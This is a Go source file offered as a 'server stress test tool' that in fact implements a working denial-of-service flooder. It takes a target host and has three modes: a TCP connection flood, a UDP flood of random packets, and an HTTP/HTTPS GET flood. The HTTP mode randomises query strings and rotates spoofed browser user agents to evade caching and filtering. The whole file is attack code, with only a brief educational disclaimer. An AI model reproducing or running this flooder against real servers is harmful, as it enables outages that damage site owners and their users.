/*
Coded By Leeon123
Date: 12/5/2019
|------------------------------------------------|
|  This tool is a server stress test tool,       |
|  It is only use for testing server firewall    |
|  and education.                                |
|------------------------------------------------|
*/
package main

import (
	"crypto/tls"
	"fmt"
	"math"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

//Start of Random useragent
var (
	UserAgents = []string{
		"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
		"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
		"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
		"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
		"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
		"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
		"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
		"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
		"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
		"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
		"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
		"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
		"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
		"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
		"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
		"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
	}
	str  string = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"
	succ        = 0
	fail        = 0
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	fmt.Println("|--------------------------------------|")
	fmt.Println("|   Golang : Server Stress Test Tool   |")
	fmt.Println("|          C0d3d By Lee0n123           |")
	fmt.Println("|--------------------------------------|")
	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s host port mode threads seconds\r\n", os.Args[0])
		fmt.Println("|--------------------------------------|")
		fmt.Println("|             Mode List                |")
		fmt.Println("|     [1] TCP-Connection flood         |")
		fmt.Println("|     [2] UDP-flood                    |")
		fmt.Println("|     [3] HTTP-flood(Auto SSL)         |")
		fmt.Println("|--------------------------------------|")
		os.Exit(1)
	}

	count := 0
	stop := 0 //stop
	error := 0
	threads, _ := strconv.Atoi(os.Args[4])
	times, _ := strconv.Atoi(os.Args[5])
	addr := os.Args[1]
	addr += ":"
	addr += os.Args[2]
	if os.Args[3] == "1" { //Tcp connection flood
		payload := "\000"
		for i := 0; i < threads; i++ {
			go func() {
				for {
					if stop > 0 {
						break
					}
					s, err := net.Dial("tcp", addr)
					if err != nil {
						error++
						return
					}
					s.Write([]byte(payload))
					count++
				}
			}()
			time.Sleep(time.Millisecond * 10)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		fmt.Println("Used:", times, "seconds", threads, "gorountines") //report
		fmt.Println("Total Sent:", count, "packets")
		fmt.Printf("PPS: %.0f packets/s\r\n", math.Floor(float64(count/times+0/5)))
		fmt.Println("Connection Error:", error, "times")
	} else if os.Args[3] == "2" { //udpflood
		bit := 0
		for i := 0; i < threads; i++ {
			go func() {
				buffer := make([]byte, 512)
				_, err := rand.Read(buffer)
				if err != nil {
					fmt.Println(err)
				}
				conn, err := net.Dial("udp", addr)
				if err != nil {
					error++
				}
				for {
					if stop > 0 {
						break
					}
					for i := 0; i < 100; i++ {
						conn.Write(buffer)
						count++
						bit += 4096
						time.Sleep(time.Millisecond * 1)
					}
				}
			}()
			time.Sleep(time.Millisecond * 5)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		fmt.Println("Used:", times, "seconds", threads, "gorountines") //report
		fmt.Println("Total Sent:", bit/1024/1024, "Mb")
		fmt.Printf("Mbps: %.2f Mb/s\r\n", float64(bit)/1024/1024/float64(times))
		fmt.Printf("PPS: %.0f packets/s\r\n", math.Floor(float64(count/times+0/5)))
		//fmt.Println("Connection Error:",error,"times")
	} else if os.Args[3] == "3" { //http/s flood
		for i := 0; i < threads; i++ {
			go func() {
				for {
					if stop > 0 {
						break
					}
					if os.Args[2] == "443" { //auto ssl
						s, err := tls.Dial("tcp", addr, nil)
						if err != nil {
							error++
							return
						}
						for t := 0; t < 140; t++ {
							s.SetWriteDeadline(time.Now().Add(2 * time.Second))
							s.SetReadDeadline(time.Now().Add(2 * time.Second))
							url2 := strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) //random url
							payload := fmt.Sprintf("GET /?" + url2 + " HTTP/1.1\r\nHost: " + os.Args[1] + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n\r\n")
							buf := make([]byte, 0, 4096) // big buffer
							tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
							s.Write([]byte(payload))
							count++
							for {
								n, err := s.Read(tmp)
								if err != nil {
									break
								}
								//fmt.Println("got", n, "bytes.")
								buf = append(buf, tmp[:n]...)

							}
							if strings.Contains(string(buf), "200") == true || strings.Contains(string(buf), "301") == true || strings.Contains(string(buf), "302") == true {
								succ++
							} else {
								fail++
							}
						}
						//count += 140
					} else {
						s, err := net.Dial("tcp", addr)
						if err != nil {
							error++
							return
						}
						for t := 0; t < 140; t++ {
							s.SetWriteDeadline(time.Now().Add(2 * time.Second))
							s.SetReadDeadline(time.Now().Add(2 * time.Second))
							url2 := strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) //random url
							payload := fmt.Sprintf("GET /?" + url2 + " HTTP/1.1\r\nHost: " + os.Args[1] + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n\r\n")
							buf := make([]byte, 0, 4096) // big buffer
							tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
							s.Write([]byte(payload))
							count++
							for {
								n, err := s.Read(tmp)
								if err != nil {
									break
								}
								//fmt.Println("got", n, "bytes.")
								buf = append(buf, tmp[:n]...)

							}
							if strings.Contains(string(buf), "200") == true || strings.Contains(string(buf), "301") == true || strings.Contains(string(buf), "302") == true {
								succ++
							} else {
								fail++
							}
							//time.Sleep(time.Microsecond*500)
						}
						//count += 140
					}
				}
			}()
			//time.Sleep(time.Millisecond * 10)
		}
		time.Sleep(time.Second * time.Duration(times)) //timer
		stop++
		fmt.Println("Used:", times, "seconds", threads, "gorountines") //report
		fmt.Println("Total Sent:", count, "requests")
		fmt.Printf("RPS: %.0f requests/s\r\n", math.Floor(float64(count/times+0/5)))
		fmt.Printf("Successed Rate: %.0f%%\r\n", (float64(succ)/float64(count))*100)
		fmt.Printf("Dropped: %d\r\n", fail)
		fmt.Println("Connection Error:", error, "times")
	}
}
